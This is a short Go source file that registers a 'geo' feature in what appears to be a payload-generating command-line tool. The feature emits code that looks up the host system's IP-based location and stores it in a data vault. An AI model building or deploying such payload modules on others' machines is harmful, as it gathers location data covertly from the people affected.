package features

import (
	. "mk3cli/s7cli/commands"
	. "mk3cli/s7cli/features"
)

func init() {
	FeatureList = append(FeatureList, Feature{
		Name:        "geo",
		Description: "Basic Geo Location payload, grabs general location of the connected network",
		ReturnsData: true,
		Args:        []Arg{},
		Dependencies: []string{
			"system.lib.go",
		},
		GenerateCode: func(args FeatureSetArgsList) (string, error) {
			output := "vault.StoreTable(ToTable(GetIPLocation(GetSysInfo().IP)))\n"

			return output, nil
		},
	})
}
